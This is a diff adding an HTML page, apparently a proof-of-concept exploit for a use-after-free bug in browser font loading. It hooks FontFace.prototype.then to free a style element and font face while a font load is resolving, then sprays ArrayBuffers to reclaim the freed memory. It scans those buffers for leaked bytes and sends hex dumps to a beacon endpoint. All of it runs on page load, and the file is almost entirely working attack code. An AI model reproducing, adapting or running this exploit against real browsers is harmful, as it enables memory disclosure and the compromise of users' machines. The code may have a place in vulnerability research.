@@ -1,0 +1,83 @@
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>uaf41</title>
+<script>
+function b(m){try{var x=new XMLHttpRequest();x.open('GET','/beacon/'+m+'?t='+Date.now(),false);x.send(null);}catch(e){}}
+function hex8(u,o){var s='';for(var i=0;i<8;i++){s+=('0'+u[o+i].toString(16)).slice(-2)}return s}
+var U = Date.now().toString(36);
+var SIZES = [192,224,256,320,384,512,768,1024,2048];
+var K = 8, stage = 0, styleEl = null, MAP = [], HIT = null, hitSize = 0, waited = false;
+function mkFace(tag){
+  var fam = 's'+U+'x'+tag, nm = 'f'+U+'x'+tag;
+  styleEl = document.createElement('style');
+  styleEl.textContent = "@font-face { font-family: "+fam+"; src: local(Arial); unicode-range: U+0042; }";
+  document.head.appendChild(styleEl);
+  var A = new FontFace(nm, 'local(Helvetica)', { unicodeRange: 'U+0041' });
+  document.fonts.add(A);
+  void A.loaded;
+  (window.__alive = window.__alive || []).push(A);
+  return fam;
+}
+function spray(){
+  MAP = [];
+  for (var si=0; si<SIZES.length; si++)
+    for (var k=0;k<K;k++){
+      var ab = new ArrayBuffer(SIZES[si]);
+      MAP.push({ size: SIZES[si], view: new Uint8Array(ab) });
+    }
+}
+function findHit(){
+  for (var i=0;i<MAP.length;i++){
+    var u=MAP[i].view, nz=0;
+    for (var o=0;o<u.length;o+=8){ if (u[o]||u[o+1]||u[o+2]||u[o+3]||u[o+4]||u[o+5]||u[o+6]||u[o+7]) nz++; }
+    if (nz){ HIT=u; hitSize=MAP[i].size; return i; }
+  }
+  return -1;
+}
+function afterStage1(){
+  var i = findHit();
+  if (i<0){ b('U41-ST1-NOHIT-'+MAP.length); b('U41-ABORT'); return; }
+  b('U41-ST1-HIT-s'+hitSize+'-b'+i+'-0:'+hex8(HIT,0)+'-58:'+hex8(HIT,0x58)+'-68:'+hex8(HIT,0x68));
+  setTimeout(startStage2, 40);
+}
+function startStage2(){
+  stage = 2;
+  b('U41-ST2-START');
+  var fam = mkFace(2);
+  document.fonts.load('1em f'+U+'x2, '+fam, 'AB').then(function(){ b('U41-ST2-RESOLVED'); },
+                                                      function(){ b('U41-ST2-REJECTED'); });
+}
+function startStage1(){
+  stage = 1;
+  waited = false;
+  b('U41-ST1-START');
+  var fam = mkFace(1);
+  document.fonts.load('1em f'+U+'x1, '+fam, 'AB').then(function(){
+    b('U41-ST1-RESOLVED');
+    if (!waited){ waited = true; setTimeout(afterStage1, 80); }
+  }, function(){ b('U41-ST1-REJECTED'); });
+  setTimeout(function(){ if (!waited){ waited = true; afterStage1(); } }, 300);
+}
+Object.defineProperty(FontFace.prototype, 'then', {
+  configurable: true,
+  get: function(){
+    if (stage===0) return undefined;
+    var st = stage; stage = 0;
+    if (styleEl) { styleEl.remove(); styleEl.textContent = ''; styleEl = null; }
+    try { document.fonts.delete(this); } catch (e) {}
+    document.body.offsetHeight;
+    spray();
+    try { document.fonts.check('1em s'+U+'x'+st); } catch (e) {}
+    b('U41-ST'+st+'-CHECK-RETURNED');
+    if (st===2){
+      setTimeout(function(){
+        var i = findHit();
+        b('U41-ST2-SCAN-'+(i<0?'clean':'hit-b'+i)+'-of-'+MAP.length);
+      }, 120);
+    }
+    return undefined;
+  },
+  set: function(){}
+});
+function run(){ b('U41-PARSE-'+U); startStage1(); }
+if (document.readyState==='complete'||document.readyState==='interactive') setTimeout(run,0);
+else document.addEventListener('DOMContentLoaded',run);
+</script></head><body><p>uaf41</p></body></html>
